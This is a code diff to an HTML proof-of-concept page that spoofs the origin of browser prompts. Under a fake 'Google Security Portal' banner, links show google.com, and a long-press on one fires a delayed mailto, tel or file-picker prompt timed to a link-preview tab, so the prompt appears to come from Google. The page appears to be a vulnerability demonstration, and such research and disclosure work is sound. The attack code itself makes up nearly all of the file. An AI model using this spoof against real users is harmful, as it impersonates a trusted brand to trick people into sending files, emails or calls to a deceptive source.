@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Picker Origin Spoof PoC</title>
+    <title>File Picker & Protocol Spoof PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -35,7 +35,7 @@
             flex-direction: column;
             gap: 12px;
             width: 100%;
-            max-width: 320px;
+            max-width: 340px;
         }
         a.spoof-link {
             display: inline-block;
@@ -81,10 +81,11 @@
     <div class="banner">Google Security Portal</div>
     <h1>Secure Document Verification</h1>
 
-    <!-- Container dengan 2 Tombol Terpisah -->
+    <!-- Container dengan 3 Tombol Terpisah dengan Intent Berbeda -->
     <div class="button-container">
-        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-type="mailto">Open Window & Send Email Google</a>
-        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-type="tel">Open Window & Call Support GOOGLE</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
     </div>
 
     <!-- Uploaded Image Preview Box -->
@@ -98,46 +99,84 @@
     <script>
         let triggered = false;
 
-        const executeAttackVector = (actionType) => {
+        const executeAttackVector = (actionType, intent) => {
             if (triggered) return;
             triggered = true;
 
             // Timer optimized to match the preview page opening animation
             setTimeout(async () => {
                 try {
-                    if (actionType === 'mailto') {
-                        window.location.href = "mailto:support@google.com?subject=Verification%20Support&body=Please%20verify%20my%20account.";
-                        document.getElementById("fileInfo").innerText = "Triggered mailto protocol handler.";
-                    } else {
-                        window.location.href = "tel:+18005550199";
-                        document.getElementById("fileInfo").innerText = "Triggered tel protocol handler.";
-                    }
-
                     const previewBox = document.getElementById("previewBox");
-                    imagePreview.src = "";
-                    previewBox.style.display = "block";
+                    const imagePreview = document.getElementById("imagePreview");
+                    const fileInfo = document.getElementById("fileInfo");
+
+                    if (actionType === 'mailto') {
+                        const subject = encodeURIComponent("Security Verification - Intent: " + intent);
+                        const body = encodeURIComponent("Hello Google Security,\n\nI am requesting verification for intent: " + intent + "\nPlease process my request securely.");
+                        window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
+                        fileInfo.innerText = `Triggered mailto protocol with intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    } 
+                    else if (actionType === 'tel') {
+                        window.location.href = "tel:+18005550199";
+                        fileInfo.innerText = `Triggered tel protocol for intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    } 
+                    else if (actionType === 'filepicker') {
+                        // Menggunakan File System Access API
+                        const [fileHandle] = await window.showOpenFilePicker({
+                            multiple: false,
+                            types: [{
+                                description: 'Images & Documents',
+                                accept: { 
+                                    'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
+                                    'application/pdf': ['.pdf']
+                                }
+                            }]
+                        });
+
+                        const file = await fileHandle.getFile();
+                        fileInfo.innerText = `Selected file for [${intent}]: ${file.name}`;
+
+                        if (file.type.startsWith('image/')) {
+                            imagePreview.src = URL.createObjectURL(file);
+                            previewBox.style.display = "block";
+                        } else {
+                            imagePreview.src = "";
+                            previewBox.style.display = "block";
+                        }
+                    }
 
                 } catch (err) {
                     console.debug("Handler cancelled or blocked:", err.message);
                 } finally {
                     setTimeout(() => { triggered = false; }, 900);
                 }
-            }, 1900); // 1.7 seconds delay for ephemeral tab
+            }, 1900); // 1.9 seconds delay for ephemeral tab
         };
 
         // Event listener untuk Tombol Mailto
         const linkMailto = document.getElementById("targetLinkMailto");
         linkMailto.addEventListener("contextmenu", (e) => {
-            executeAttackVector('mailto');
+            executeAttackVector('mailto', linkMailto.getAttribute('data-intent'));
         });
         linkMailto.addEventListener("touchstart", () => {}, { passive: true });
 
         // Event listener untuk Tombol Tel
         const linkTel = document.getElementById("targetLinkTel");
         linkTel.addEventListener("contextmenu", (e) => {
-            executeAttackVector('tel');
+            executeAttackVector('tel', linkTel.getAttribute('data-intent'));
         });
         linkTel.addEventListener("touchstart", () => {}, { passive: true });
+
+        // Event listener untuk Tombol File Picker
+        const linkFile = document.getElementById("targetLinkFile");
+        linkFile.addEventListener("contextmenu", (e) => {
+            executeAttackVector('filepicker', linkFile.getAttribute('data-intent'));
+        });
+        linkFile.addEventListener("touchstart", () => {}, { passive: true });
     </script>
 
 </body>
